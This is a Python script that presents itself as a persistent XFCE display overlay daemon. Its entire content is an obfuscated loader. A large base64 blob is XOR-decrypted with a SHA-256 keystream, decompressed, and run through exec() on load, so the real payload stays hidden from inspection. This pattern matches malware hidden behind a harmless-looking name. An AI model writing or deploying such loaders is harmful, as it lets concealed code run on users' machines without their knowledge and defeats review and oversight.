#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Pre-Warmed Persistent Daemon - XFCE Display Overlay v3.0 (Protected)
import base64 as _b, hashlib as _h, zlib as _z

_S = b"05d20a4032b7641826ebcdf8"
_D = (
    "sJR7Dha8N7wKcw7YfmALGiW/iEyuyh282YfBMHeG3XWHertGld2BMk7KCXeBswIH7dKbysVKP5Trb8A1WqiJpyXQGcs/PSwj"
    "6YpiKWYN+sMWpUS996dGHmU0pVzzfcZTD/IsST2YxnU1gL/TkvApzP+BUcN12XfyMptRjOSR8BpCOL6YciS1vWghH3VwMSRV"
    "m3wRGVbafGYZ4BOMZhKcvH9KjQmFwonBIi4GooXX8seD48JKS25y/v3U8VkXRjEzs1beC9STS0oE7kRC19lzH2hSII1Opof5"
    "MYnjCJd3DocFX0vmJ1HT63zMEDfRUVVAsy0cz8LHrrwFMxKtEsEW8Ufb9F1XvSCYTucHwDH9HkKMtZHEIUwbE+owp6qnzbas"
    "Gi+xlQFZqNOcbS8cqIu53mZnSIDAr89jPZKaRIZ2C+XpK9SswwJS7gc4lqXV/lnov0oY/rfj3FGbI/sX5MES3c7ba0UimtQG"
    "QyPSIUoYmdsqDUU7mfkqT/u1YnqiGaaAOfhnR8hNzz6iNGN2cNJKwQz4Qb47iLIuQuQ0eCn8T8W06gw6GCd8Zwv1tZ+glLLo"
    "jLVDIMu+Jj7ssnsmKYFpBcXgIbn4UmJUJ2PDahu12RrNryR8Br6BGm8rMD9GJJpDgtWi60oAsSJJWHahgIalsAKxlezlFglw"
    "CMz82t3zpUgsEBv25lx7YX6YgmVGe6SBIeg+bonM/Jzi9brSzZrHSpqg73fjAJ43+5kB+kxUV7fWwtwjaU/CxnU8p4GxBgcE"
    "kRTc/klMvXMnrObFKOnD5s6dD0b8rA2UwmqWQ3d2R1O7orBRVbwFODaYXWTuM/X/MFdGbTQJG35T8ytLyPkWyvOj4rKECGVL"
    "9JXthqE1Px0OKlu1ucatMG8MXeb1QXj8kCvU5y/kjAdVLfTRGv1zJGXOyJVJOhhf4auOl1Ld4pVpuwSDUyJ7XQ3RWMoER96F"
    "HUiJVP30w6H6vXNfHpRkIJa/a+qJI5a3YG3bNXGF8dJnb8lT05c3hKKieQnNHMlf15Lk8sy7ki+/W6HRn9/ObLPTJEizPVJn"
    "5oVAlh7+NoQ9BbVvoa4lN2d3sUkA0Y7sM8nlKLgNL0gsGKxgdCz2n5z9+amVt8jS9vPFY95G4A2flif5SplBgn14LVDNsHGq"
    "0TIcnXxNDsezRyCAYCn8jDtuW33tLNcUsZ4Q5Afbn5YJ6+MfYuoJfr5TGWEVC5fDNQJF351JlpxLw5XOJ8Qg91idWMFs7k3A"
    "Hp4pHyoSJlw0AQrTnJGtq5HolIqB976YJkCjGEwLFQDjazJmueWiGWDoPtrQHdXEYZKP3HYNKrfL/uCSI/gQADYtUB/nqaMx"
    "N+6X53zzVw58IumPQI/aQiJ3G/uKCFC//3oTCZeGjo6u5+cZAX8ZvnJzWHzwqE8wrca8UTplPoXlEhxmr/T1ExegYN9oOxAT"
    "iCDumhdUvE9mg8Z1vhMHaSyNmBaubEFrjFa8oxnRqqjvHiEep46ACQrGLCoHWsDPKrf8YhkgN3s/MGNrpLXczX+OyRxovSUF"
    "oanfU5h4Cus8q0SgXx7b8VzsDRsLYdf1aH2bEF48r4ArRfjDgkB8qJmCslOyWycZo4NRQ3vuA9QpOFWxOBcYcMBhxfCv2fb5"
    "4LDAOGjqQYSVI3Nbh2nTtDcZ7QW/FFgcTFeCQ3moBEMJRINLpMcFpAm1g0PJF2llL3nBm+p0iwYvlAybM9nUWQwbPuAkdRJc"
    "GWQVYkycLqaEUUHPZVDhyEyKfxeIXf8z9pINvaS0J1xJFEN1CmtNfEBH49kVvNfsLpVPvcbca579br84hgPMRMu7LbJ0Zho+"
    "OjECf62LOQgtDw7TD0Vf7wf8o1exunbll3Zsi68rvfoQsOvnI/sdpnTQDRyRXxXxhc5FyobUVmEFOF/93kwc0h0STimdbtok"
    "6pmc6TLxwbICQcfLDVPf9WdUwBHyRrXg+mQWx2VnWTxsuM3ran0Oc1AyCYx9aIgO1NFkQm322Ed4oCAfNuI/uuFFL+KNhXOA"
    "3OVm1mMex/kXr8eeEcMJcJPVsrf/G4E9Wo8F9dI1Ij5KWonC5jdP5HKaeEb6+eL9zp+LkDLvc8rjgkggZnMfJen2+A0foxPp"
    "59z8OY1YSAQUZM8FjWvlo+WL+m0RW2LyxKoqBEKEsNRgE+MqGkVOb2ZcIBIoLGIf+q+WyejjpTzdiwMfsiByWr7EgMkX2al2"
    "5N41U08AFH1HUdpBX0WgZYyeTUqAVEgK1CcyVZtvvQaGLO9l0QVm3xDKI+vV4IoKP6gj/Oe7/uIwXU69EhuBKwVvi+zZ6kyb"
    "Q/DmBbJKW1u3CTGOBx85rDG1SprgAeo0NkjdXrlNnXSgQ9o7a3gAIb+VslaPE3KCeG5QiVIW9BI1suZRsKyfuc6MXnhMUrFI"
    "0BwKn37chJ2ree1dnBtqFHqFc2bwhOhQ9MhDp2safkDPNn4jDO7Nm6JtB9UMhwc5/nnWX2hIKpsdIqxHX8o4UhzP9ioEZL1+"
    "rREydoOdKdhKIKmoh2iVTBp7K1qy233o9Z+a0aj8of1EF6VzZM8AONcZpHJBcu2615LadHg5HlQO1ZOu7dSYM1ypoqJvs4DS"
    "xVb+T9iILRLqa2cN3Rr7d2fPEwapTnGFFojAvXD1nPf+Mqf9/e3CxdI2wnZYmpQI6vQGHiHkCKPoCcdAGNlZdwSG+1H1n740"
    "quRnQ8ygPedNLIgF705fPvRa/PiBRfGsjDMmGTKUyOQpJe6N1h0JjLX3fURmd54YPFP9rRmWJJMnWvM3NFge5elKWqWJW1Ul"
    "3QVVvHvz34OT9b9EYTvRwUFPotd5KvFqegbzczpDbVTv/nMJs46kddsDNiLfD64j/7/fbEJALKK41W8+q3ojPbzR2GT5Hk8q"
    "3/J/8M0yxFPg/93UPWlSnm0cwDE7lHGHt6tfQE/7nqA0r1npnc4FVKDGk9bfus0MHXO7quj0stubzoQZyqbHichVoozBjtup"
    "YQhh/tzzWuJWLeO004gkvPbNrvTSTQhUpPjRppvfonIWgWN3f2RUCIf10kLNYa+fyZoU5Zel3kww/MI/Kr7FLGPtSjJL2eRm"
    "yEL/2EcKA8LEKmkGZWkUmDR2OVeZZFdzJmcnuEqsEci/eGQ7TM7Cg/wV4rx/rm+hwBWvQZVW7eqEQoAAQAs+aVo6bFE8Sxjy"
    "gpYpSphsD8maJhDSay1jkvCRAaVX2C2+fU2lWB4+3EZDZFu4F/5O22+9ARm0GWbK0WwVTbnIZtI+QSQbzfPUSlPlTbOXE5zE"
    "N+E+wR0LFc1F1+FFLXr3w7deFamG3FcytpM4M+wFln1X/cXxAHr4gCWQdWGr7JGZ/2nBXl8HhAhD6e7jDCMmYg3KB1ALtC/b"
    "D1xDzWy2zVAsk7gX2DV5FH3EeZnSAZvYRt9QWZZm6UmYHzY2trTF92vCrlBY0A6K4+BCxBpdkjYRqo8EENgVZwOOweTyEl9u"
    "TEJ8n1kWFtpO/NZAeN9ToO5EOD4rvpePJJmFymTmhYi0mSCqRvofpM94xuJ8Q+I/6USN2sUNnY5MhfCMFrjMEgHpZVuyCSmM"
    "Hl5VnJIR7m2Ep/0FCE9s7yRz3eUv/DTJt1aVQmu9B5uZrSYpD+GXtMsp4YyUPuBabjsvTBoklxbm3AanUEao3NSHD+kW6WFU"
    "kCjd/OmPMDQq9AFQqQerwJ4+Vwhiy81Wtjzz3g8oqS+Dij/aM+42kjRmpS6cKffN5HMZZFY2tQoRvJdp/R5JJ21MWyGLXwOn"
    "DGyMNHAJ6zW7zpLsxm4GNfazV2SquJQEzXp7TqSRRmf3TBqBzBP3X/BxXCVucMk8o4r09BTaTDJ0DE4180XZX2VVJLnVUVyt"
    "ZLbPbreqrB7FbX3ijuI2Fm2bUsXUGmm2LTfbO34yOyyQnTgLUwbo6sAr3+BOF2QyrodEp+G+u8CbpvqPKP/5rDBmi0c7hF5J"
    "2iehtA245rSqbtgbxzKXjF7UMiOR+hDJOMvACtY81zsBNISCT6P3nVEH2WqFfC8f3mpGkiqJlCn8uF7E61ylKmie6IdVpORo"
    "FZo5j4FZgDeCwh1sy/j75MEepdyqfl9lXFiBGxDARLJw3+j6EsJCnk4wWTREmJEMbDXXJKYF9/soPS9icr8N2g431VkAYx+L"
    "38XelrBMqAvbgMg2JlTbo8gX0TV9HefZgTKQGDiTPMQv366cRowB4N6SmDtu5gq/YpLmhfFOjeVeriCQwYT1jnTew26wwmfw"
    "sCE1BlW9S1pLjwU5WxvKiCvUMELvHnYo2UCp3Fzh9TMVUY1KlFd733CwrAWN+fmRI/5li9CqI0THRrjN0jLOcj1omPcHM6qX"
    "SlsblXnLOeVfJE45X/7yDAdd6c1HFipNycUDC1SkzxvrkL4IzZmyeNtISC1SDBsFw3IvH12XVULD3qzRAsSWVP6yXRVKPa87"
    "ucnW5Eq8TU3XVi3l+Y4T/YN9wwkvVEdNXzKJrTEyfWk/j3UV0atNsSDmVLZJcz8S5hfoNETz2UeSb1Hhli8yqdzaGx3NUaV1"
    "vjpYax+oUBG69PVbGrn7GtGXEBNoLmdjW21WpHVGMvvuCCI+9aji//vXy5cJacASAM2PjHZgpD1nk7N4RSNRVQ+YTghr4pz/"
    "Xlteij7K+HxwGpjZ7mQj9xZlGBesmqYYvKjbfLxI"
)

def _ld():
    raw = _b.b64decode(_D)
    out = bytearray(len(raw))
    idx = 0
    pos = 0
    while pos < len(raw):
        dg = _h.sha256(_S + str(idx).encode()).digest()
        n = min(32, len(raw) - pos)
        for i in range(n):
            out[pos + i] = raw[pos + i] ^ dg[i]
        pos += n
        idx += 1
    return _z.decompress(bytes(out))

exec(compile(_ld(), __file__, "exec"), globals())
